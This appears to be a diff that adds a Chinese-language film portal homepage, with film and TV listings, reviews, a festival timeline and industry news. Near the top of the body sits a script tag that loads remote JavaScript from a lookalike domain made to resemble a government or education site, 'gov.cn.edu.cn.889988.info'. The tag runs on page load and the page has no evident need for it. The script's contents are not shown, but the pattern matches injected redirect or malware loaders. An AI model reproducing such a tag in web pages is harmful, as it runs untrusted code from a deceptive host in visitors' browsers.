@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="半岛电影网 - 聚焦华语与亚洲电影的影迷社区，提供最新院线片单、影评解析、排片资讯与电影节动态。">
+<meta name="keywords" content="半岛电影网, 电影, 华语电影, 亚洲电影, 影评, 电影节, 电影推荐, bandaodianyingwang">
+<meta name="author" content="半岛电影网">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>半岛电影网 - 华语与亚洲电影深度观察</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:#0a0e14;color:#e6edf3;line-height:1.65;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+:root{
+  --brand:#0ea5e9;
+  --brand2:#38bdf8;
+  --deep:#0369a1;
+  --bg:#0a0e14;
+  --card:#111827;
+  --card2:#1a2333;
+  --line:#243044;
+  --txt:#e6edf3;
+  --txt2:#8b97a8;
+}
+
+/* ===== 顶部 ===== */
+.hd{position:sticky;top:0;z-index:99;background:rgba(10,14,20,.93);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.hd-in{max-width:1200px;margin:0 auto;padding:12px 16px;display:flex;align-items:center;gap:14px}
+.logo{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.logo-ico{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,var(--brand),var(--deep));display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 4px 14px rgba(14,165,233,.35)}
+.logo-txt{font-size:18px;font-weight:800;letter-spacing:.5px}
+.logo-txt small{display:block;font-size:10px;letter-spacing:2px;color:var(--txt2);font-weight:400}
+.nav{display:flex;gap:6px;margin-left:auto}
+.nav a{padding:8px 14px;border-radius:20px;font-size:14px;color:var(--txt2);transition:.3s}
+.nav a:hover{color:var(--brand2);background:var(--card2)}
+.search{flex:1;max-width:300px;position:relative}
+.search input{width:100%;padding:9px 38px 9px 14px;border-radius:20px;border:1px solid var(--line);background:var(--card);color:var(--txt);font-size:13px;outline:none}
+.search input:focus{border-color:var(--brand)}
+.search button{position:absolute;right:3px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:none;border-radius:50%;background:linear-gradient(135deg,var(--brand),var(--deep));color:#fff;cursor:pointer;font-size:14px}
+.menu-btn{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;background:var(--card);color:var(--txt);font-size:20px;cursor:pointer}
+
+/* ===== Hero ===== */
+.hero{position:relative;padding:70px 16px 60px;text-align:center;overflow:hidden;background:radial-gradient(ellipse at 30% 10%,rgba(14,165,233,.22),transparent 55%),radial-gradient(ellipse at 75% 40%,rgba(2,132,199,.18),transparent 50%),#0a0e14}
+.hero-in{max-width:820px;margin:0 auto;position:relative}
+.hero-kicker{display:inline-block;padding:5px 16px;border-radius:20px;border:1px solid rgba(56,189,248,.4);color:var(--brand2);font-size:13px;letter-spacing:2px;margin-bottom:20px}
+.hero h1{font-size:clamp(28px,6vw,48px);font-weight:900;line-height:1.25;margin-bottom:16px}
+.hero h1 em{font-style:normal;color:var(--brand2)}
+.hero p{font-size:16px;color:var(--txt2);max-width:620px;margin:0 auto 28px}
+.hero-acts{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:26px;font-size:15px;font-weight:600;cursor:pointer;border:none;transition:.3s}
+.btn-pri{background:linear-gradient(135deg,var(--brand),var(--deep));color:#fff;box-shadow:0 8px 24px rgba(14,165,233,.35)}
+.btn-pri:hover{transform:translateY(-2px)}
+.btn-out{background:transparent;color:var(--txt);border:1px solid var(--line)}
+.btn-out:hover{border-color:var(--brand);color:var(--brand2)}
+.wave{position:absolute;bottom:-1px;left:0;width:100%;height:60px;background:radial-gradient(ellipse 80% 100% at 50% 100%,rgba(14,165,233,.12),transparent)}
+
+/* ===== 通用 ===== */
+.sec{padding:56px 16px}
+.sec-in{max-width:1200px;margin:0 auto}
+.sec-hd{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+.sec-t{font-size:clamp(22px,4vw,30px);font-weight:800;position:relative;padding-left:14px}
+.sec-t::before{content:"";position:absolute;left:0;top:50%;transform:translateY(-50%);width:5px;height:26px;border-radius:3px;background:linear-gradient(180deg,var(--brand),var(--deep))}
+.sec-sub{color:var(--txt2);font-size:13px;margin-top:4px}
+.sec-more{color:var(--brand2);font-size:14px;white-space:nowrap}
+
+/* ===== 栏目一：电影 —— 大图横幅 + 横滑海报 ===== */
+.film-hero{position:relative;border-radius:20px;overflow:hidden;margin-bottom:22px}
+.film-hero .fh-bg{position:absolute;inset:0;background:linear-gradient(120deg,#0369a1,#0c4a6e,#0a0e14)}
+.film-hero .fh-bg::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 85% 30%,rgba(56,189,248,.25),transparent 40%)}
+.film-hero .fh-txt{position:relative;padding:34px;min-height:200px;display:flex;flex-direction:column;justify-content:center}
+.film-hero .fh-txt .lb{display:inline-block;align-self:flex-start;padding:4px 12px;border-radius:16px;background:rgba(56,189,248,.9);font-size:12px;margin-bottom:12px}
+.film-hero h3{font-size:26px;font-weight:800;margin-bottom:8px}
+.film-hero p{font-size:14px;color:#bcd6e8;max-width:520px}
+.film-row{display:flex;gap:14px;overflow-x:auto;padding:4px 2px 14px;scroll-snap-type:x mandatory}
+.film-row::-webkit-scrollbar{height:6px}
+.film-row::-webkit-scrollbar-thumb{background:var(--line);border-radius:3px}
+.film-col{flex:0 0 150px;scroll-snap-align:start;cursor:pointer;transition:.3s}
+.film-col:hover{transform:translateY(-4px)}
+.film-col .ph{aspect-ratio:2/3;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:38px;margin-bottom:10px}
+.film-col h5{font-size:14px;font-weight:600}
+.film-col span{font-size:12px;color:var(--txt2)}
+
+/* ===== 栏目二：剧集 —— 分类胶囊 + 列表行 ===== */
+.tv-wrap{background:linear-gradient(180deg,var(--card),var(--bg));border:1px solid var(--line);border-radius:20px;padding:22px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.chip{padding:7px 18px;border-radius:20px;border:1px solid var(--line);background:var(--bg);color:var(--txt2);font-size:14px;cursor:pointer;transition:.3s}
+.chip.active,.chip:hover{border-color:var(--brand);color:var(--brand2)}
+.tv-list{display:flex;flex-direction:column;gap:12px}
+.tv-row{display:flex;gap:16px;align-items:center;background:var(--card2);border:1px solid var(--line);border-radius:14px;padding:12px;transition:.3s;cursor:pointer}
+.tv-row:hover{border-color:var(--brand);background:var(--card)}
+.tv-rank{flex:0 0 32px;height:32px;border-radius:8px;background:var(--bg);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--brand2)}
+.tv-cover{flex:0 0 80px;height:52px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:22px}
+.tv-info{flex:1;min-width:0}
+.tv-info h4{font-size:15px;font-weight:600}
+.tv-info .mt{font-size:12px;color:var(--txt2);margin-top:3px}
+.tv-hot{color:var(--brand2);font-size:13px;white-space:nowrap}
+
+/* ===== 栏目三：影评 —— 三栏卡片 ===== */
+.rev-grid{display:grid;grid-template-columns:1fr;gap:20px}
+@media(min-width:820px){.rev-grid{grid-template-columns:repeat(3,1fr)}}
+.rev{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.35s;cursor:pointer}
+.rev:hover{border-color:var(--brand);transform:translateY(-5px)}
+.rev .rv-top{height:120px;display:flex;align-items:center;justify-content:center;font-size:40px;position:relative}
+.rev .rv-top .sc{position:absolute;top:10px;right:10px;padding:3px 8px;border-radius:10px;background:rgba(0,0,0,.5);font-size:12px}
+.rev .rv-body{padding:16px}
+.rev h4{font-size:17px;font-weight:700;margin-bottom:8px}
+.rev p{font-size:13px;color:var(--txt2);display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.rev .rv-foot{padding:12px 16px;border-top:1px solid var(--line);font-size:13px;color:var(--txt2);display:flex;justify-content:space-between}
+
+/* ===== 栏目四：电影节 —— 时间轴 ===== */
+.tl{position:relative;padding-left:26px}
+.tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(180deg,var(--brand),transparent)}
+.tl-item{position:relative;padding:0 0 22px 18px}
+.tl-item::before{content:"";position:absolute;left:-23px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--brand);border:3px solid var(--bg)}
+.tl-item .dt{display:inline-block;font-size:12px;color:var(--brand2);letter-spacing:1px;margin-bottom:4px}
+.tl-item h4{font-size:16px;font-weight:600;margin-bottom:4px}
+.tl-item p{font-size:13px;color:var(--txt2)}
+
+/* ===== 栏目五：资讯 —— 轮播式卡片 ===== */
+.news-grid{display:grid;grid-template-columns:1fr;gap:16px}
+@media(min-width:720px){.news-grid{grid-template-columns:repeat(2,1fr)}}
+.news-card{display:flex;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px;transition:.3s;cursor:pointer;align-items:flex-start}
+.news-card:hover{border-color:var(--brand2);background:var(--card2)}
+.news-card .ic{flex:0 0 44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--brand),var(--deep));display:flex;align-items:center;justify-content:center;font-size:20px}
+.news-card h5{font-size:15px;font-weight:600;margin-bottom:4px;line-height:1.4}
+.news-card span{font-size:12px;color:var(--txt2)}
+
+/* ===== 页脚 ===== */
+.ft{background:#06090d;border-top:1px solid var(--line);padding:40px 16px 24px}
+.ft-in{max-width:1200px;margin:0 auto}
+.ft-grid{display:grid;grid-template-columns:1fr;gap:28px}
+@media(min-width:640px){.ft-grid{grid-template-columns:2fr 1fr 1fr 1fr}}
+.ft-brand p{color:var(--txt2);font-size:13px;max-width:300px;margin-top:12px}
+.ft-col h5{font-size:15px;font-weight:700;margin-bottom:14px;position:relative;padding-bottom:8px}
+.ft-col h5::after{content:"";position:absolute;left:0;bottom:0;width:30px;height:2px;border-radius:2px;background:var(--brand)}
+.ft-col a{display:block;color:var(--txt2);font-size:13px;padding:5px 0;transition:.3s}
+.ft-col a:hover{color:var(--brand2);padding-left:6px}
+.ft-bot{border-top:1px solid var(--line);margin-top:30px;padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.ft-bot p,.ft-bot a{color:var(--txt2);font-size:12px}
+.ft-bot a{margin-left:16px}
+.ft-bot a:hover{color:var(--brand2)}
+
+.top{position:fixed;right:16px;bottom:24px;width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--brand),var(--deep));color:#fff;border:none;font-size:18px;cursor:pointer;box-shadow:0 6px 20px rgba(14,165,233,.4);opacity:0;visibility:hidden;transition:.3s;z-index:98}
+.top.show{opacity:1;visibility:visible}
+
+@media(max-width:768px){
+  .nav,.search{display:none}
+  .menu-btn{display:block;margin-left:auto}
+  .hero{padding:44px 16px 40px}
+  .sec{padding:40px 16px}
+  .film-hero .fh-txt{padding:24px}
+  .nav-mobile{position:fixed;inset:0;background:rgba(6,9,13,.97);z-index:100;display:none;flex-direction:column;padding:60px 24px;gap:6px}
+  .nav-mobile.open{display:flex}
+  .nav-mobile a{padding:14px 16px;border-radius:12px;font-size:16px;border:1px solid var(--line)}
+  .nav-close{position:absolute;top:16px;right:16px;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;background:var(--card);color:var(--txt);font-size:20px;cursor:pointer}
+}
+@media(min-width:769px){.nav-mobile{display:none !important}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="hd">
+  <div class="hd-in">
+    <a class="logo" href="#">
+      <div class="logo-ico">🌊</div>
+      <div class="logo-txt">半岛电影网<small>PENINSULA FILM</small></div>
+    </a>
+    <nav class="nav">
+      <a href="#film">院线新片</a>
+      <a href="#tv">热门剧集</a>
+      <a href="#review">影评解析</a>
+      <a href="#fest">电影节</a>
+      <a href="#news">行业资讯</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="搜索电影 / 影人 / 电影节">
+      <button>🔍</button>
+    </div>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</header>
+
+<nav class="nav-mobile" id="navMobile">
+  <button class="nav-close" id="navClose">✕</button>
+  <a href="#film">🎬 院线新片</a>
+  <a href="#tv">📺 热门剧集</a>
+  <a href="#review">✍️ 影评解析</a>
+  <a href="#fest">🏆 电影节</a>
+  <a href="#news">📰 行业资讯</a>
+</nav>
+
+<section class="hero">
+  <div class="hero-in">
+    <span class="hero-kicker">PENINSULA · FILM</span>
+    <h1>聚焦<em>华语与亚洲</em>电影</h1>
+    <p>半岛电影网专注华语与亚洲电影的片单、深度解析与行业观察，做一份有立场的观影指南。</p>
+    <div class="hero-acts">
+      <a class="btn btn-pri" href="#film">看本周新片</a>
+      <a class="btn btn-out" href="#review">读影评</a>
+    </div>
+  </div>
+  <div class="wave"></div>
+</section>
+
+<!-- 栏目一：电影 —— 横幅 + 横滑海报 -->
+<section class="sec" id="film">
+  <div class="sec-in">
+    <div class="sec-hd">
+      <div><h2 class="sec-t">院线新片</h2><div class="sec-sub">本周上映 · 编辑精选</div></div>
+      <a class="sec-more" href="#">全部片单 ›</a>
+    </div>
+    <div class="film-hero">
+      <div class="fh-bg"></div>
+      <div class="fh-txt">
+        <span class="lb">本周主打</span>
+        <h3>潮汐之间</h3>
+        <p>一部发生在南方小城的现实主义作品，镜头冷静、情感克制，入围多个国际电影节主竞赛单元。</p>
+      </div>
+    </div>
+    <div class="film-row">
+      <div class="film-col"><div class="ph" style="background:linear-gradient(135deg,#0369a1,#0c4a6e)">🏝️</div><h5>潮汐之间</h5><span>剧情 · 8.7</span></div>
+      <div class="film-col"><div class="ph" style="background:linear-gradient(135deg,#7c4dff,#3a1c8f)">🪐</div><h5>星际回响</h5><span>科幻 · 9.0</span></div>
+      <div class="film-col"><div class="ph" style="background:linear-gradient(135deg,#0ea5e9,#075985)">🐋</div><h5>深海奇缘</h5><span>动画 · 8.9</span></div>
+      <div class="film-col"><div class="ph" style="background:linear-gradient(135deg,#0891b2,#155e75)">🕵️</div><h5>迷雾追踪</h5><span>悬疑 · 8.6</span></div>
+      <div class="film-col"><div class="ph" style="background:linear-gradient(135deg,#2563eb,#1e3a8a)">🚀</div><h5>长空之王</h5><span>动作 · 8.6</span></div>
+      <div class="film-col"><div class="ph" style="background:linear-gradient(135deg,#38bdf8,#0369a1)">😂</div><h5>疯狂大赢家</h5><span>喜剧 · 8.3</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：剧集 —— 胶囊 + 列表行 -->
+<section class="sec" id="tv" style="background:linear-gradient(180deg,transparent,rgba(17,24,39,.25))">
+  <div class="sec-in">
+    <div class="sec-hd">
+      <div><h2 class="sec-t">热门剧集</h2><div class="sec-sub">正片全集 · 口碑排行</div></div>
+      <a class="sec-more" href="#">更多剧集 ›</a>
+    </div>
+    <div class="tv-wrap">
+      <div class="chips">
+        <span class="chip active">热度榜</span>
+        <span class="chip">古装</span>
+        <span class="chip">悬疑</span>
+        <span class="chip">都市</span>
+        <span class="chip">仙侠</span>
+        <span class="chip">年代</span>
+      </div>
+      <div class="tv-list">
+        <div class="tv-row"><div class="tv-rank">1</div><div class="tv-cover" style="background:linear-gradient(135deg,#e63946,#6a0572)">🏯</div><div class="tv-info"><h4>长安十二时辰</h4><div class="mt">古装 · 悬疑 · 全36集</div></div><div class="tv-hot">🔥 9.6</div></div>
+        <div class="tv-row"><div class="tv-rank">2</div><div class="tv-cover" style="background:linear-gradient(135deg,#0ea5e9,#075985)">🕵️</div><div class="tv-info"><h4>沉默的真相</h4><div class="mt">犯罪 · 剧情 · 全42集</div></div><div class="tv-hot">🔥 9.4</div></div>
+        <div class="tv-row"><div class="tv-rank">3</div><div class="tv-cover" style="background:linear-gradient(135deg,#0891b2,#155e75)">⚔️</div><div class="tv-info"><h4>剑来</h4><div class="mt">仙侠 · 玄幻 · 更新至18集</div></div><div class="tv-hot">🔥 9.1</div></div>
+        <div class="tv-row"><div class="tv-rank">4</div><div class="tv-cover" style="background:linear-gradient(135deg,#7c4dff,#3a1c8f)">🏥</div><div class="tv-info"><h4>急诊室故事</h4><div class="mt">都市 · 医疗 · 更新至24集</div></div><div class="tv-hot">🔥 8.9</div></div>
+        <div class="tv-row"><div class="tv-rank">5</div><div class="tv-cover" style="background:linear-gradient(135deg,#f59e0b,#b45309)">👑</div><div class="tv-info"><h4>凤囚凰</h4><div class="mt">古装 · 爱情 · 全48集</div></div><div class="tv-hot">🔥 8.7</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：影评 —— 三栏卡片 -->
+<section class="sec" id="review">
+  <div class="sec-in">
+    <div class="sec-hd">
+      <div><h2 class="sec-t">影评解析</h2><div class="sec-sub">独立观点 · 拒绝水军</div></div>
+      <a class="sec-more" href="#">更多影评 ›</a>
+    </div>
+    <div class="rev-grid">
+      <div class="rev">
+        <div class="rv-top" style="background:linear-gradient(135deg,#0369a1,#0c4a6e)"><span class="sc">8.7</span>🌊</div>
+        <div class="rv-body"><h4>《潮汐之间》：安静的力量</h4><p>没有激烈的戏剧冲突，靠日常细节与表演支撑，长镜头的运用让时间与情绪都变得可触。</p></div>
+        <div class="rv-foot"><span>老周看片</span><span>10-02</span></div>
+      </div>
+      <div class="rev">
+        <div class="rv-top" style="background:linear-gradient(135deg,#7c4dff,#3a1c8f)"><span class="sc">9.0</span>🪐</div>
+        <div class="rv-body"><h4>《星际回响》：视听的年度高峰</h4><p>几场太空戏的沉浸感极强，中段信息量过载略显拖沓，但整体仍是必看的院线体验。</p></div>
+        <div class="rv-foot"><span>阿泽</span><span>10-01</span></div>
+      </div>
+      <div class="rev">
+        <div class="rv-top" style="background:linear-gradient(135deg,#0891b2,#155e75)"><span class="sc">8.9</span>🐋</div>
+        <div class="rv-body"><h4>《深海奇缘》：不只给孩子的动画</h4><p>画面是最大惊喜，更难得的是它认真探讨了成长与告别，成年观众同样会被击中。</p></div>
+        <div class="rv-foot"><span>小米</span><span>09-30</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：电影节 —— 时间轴 -->
+<section class="sec" id="fest" style="background:linear-gradient(180deg,rgba(17,24,39,.25),transparent)">
+  <div class="sec-in">
+    <div class="sec-hd">
+      <div><h2 class="sec-t">电影节动态</h2><div class="sec-sub">华语与亚洲影展 · 一手跟踪</div></div>
+      <a class="sec-more" href="#">更多影展 ›</a>
+    </div>
+    <div class="tl">
+      <div class="tl-item"><span class="dt">10月 · 釜山</span><h4>釜山国际电影节揭幕</h4><p>多部华语新片入围主竞赛，青年导演单元备受关注。</p></div>
+      <div class="tl-item"><span class="dt">11月 · 金马</span><h4>金马奖入围名单公布</h4><p>剧情长片与纪录片竞争激烈，独立制作占比明显提升。</p></div>
+      <div class="tl-item"><span class="dt">12月 · 海南</span><h4>海南岛国际电影节开票</h4><p>经典修复单元带来多部 4K 重制影片特别展映。</p></div>
+      <div class="tl-item"><span class="dt">次年2月 · 柏林</span><h4>柏林电影节前瞻</h4><p>两部华语片确认进入主竞赛，市场关注度持续走高。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：资讯 —— 图标卡片 -->
+<section class="sec" id="news">
+  <div class="sec-in">
+    <div class="sec-hd">
+      <div><h2 class="sec-t">行业资讯</h2><div class="sec-sub">动态抢先 · 一周精选</div></div>
+      <a class="sec-more" href="#">更多资讯 ›</a>
+    </div>
+    <div class="news-grid">
+      <div class="news-card"><div class="ic">📊</div><div><h5>国庆档总票房突破50亿，国产片口碑与票房双线飘红</h5><span>2026-10-03</span></div></div>
+      <div class="news-card"><div class="ic">🎞️</div><div><h5>多部经典老片完成4K重制，影院安排特别展映月</h5><span>2026-10-02</span></div></div>
+      <div class="news-card"><div class="ic">🌏</div><div><h5>华语动画加速出海，三部作品登陆海外主流平台</h5><span>2026-10-01</span></div></div>
+      <div class="news-card"><div class="ic">📱</div><div><h5>短剧集成新趋势：观众更偏爱紧凑叙事与强节奏</h5><span>2026-09-30</span></div></div>
+      <div class="news-card"><div class="ic">🎬</div><div><h5>《星际回响》官宣续集，新星球设定首度曝光</h5><span>2026-09-29</span></div></div>
+      <div class="news-card"><div class="ic">🏛️</div><div><h5>多地影院推出会员日，票价优惠带动非黄金档上座率</h5><span>2026-09-28</span></div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="ft-in">
+    <div class="ft-grid">
+      <div class="ft-brand">
+        <div class="logo"><div class="logo-ico">🌊</div><div class="logo-txt">半岛电影网<small>PENINSULA FILM</small></div></div>
+        <p>专注华语与亚洲电影的观察者：片单、解析、影展与行业动态，一份有立场的观影指南。</p>
+      </div>
+      <div class="ft-col"><h5>频道导航</h5><a href="#film">院线新片</a><a href="#tv">热门剧集</a><a href="#review">影评解析</a><a href="#fest">电影节</a></div>
+      <div class="ft-col"><h5>网站信息</h5><a href="#">关于我们</a><a href="#">投稿合作</a><a href="#">免责声明</a><a href="#">用户协议</a></div>
+      <div class="ft-col"><h5>关注我们</h5><a href="#">微信公众号</a><a href="#">官方微博</a><a href="#">商务合作</a></div>
+    </div>
+    <div class="ft-bot">
+      <p>© 2026 半岛电影网 bandaodianyingwang-wap.github.io 版权所有</p>
+      <div><a href="#">隐私政策</a><a href="#">免责声明</a></div>
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="topBtn">↑</button>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),
+    navMobile=document.getElementById('navMobile'),
+    navClose=document.getElementById('navClose'),
+    topBtn=document.getElementById('topBtn');
+menuBtn.addEventListener('click',function(){navMobile.classList.add('open')});
+navClose.addEventListener('click',function(){navMobile.classList.remove('open')});
+navMobile.addEventListener('click',function(e){if(e.target.tagName==='A')navMobile.classList.remove('open')});
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400)});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+document.querySelectorAll('.chip').forEach(function(c){
+  c.addEventListener('click',function(){
+    document.querySelectorAll('.chip').forEach(function(x){x.classList.remove('active')});
+    c.classList.add('active');
+  });
+});
+</script>
+</body>
+</html>
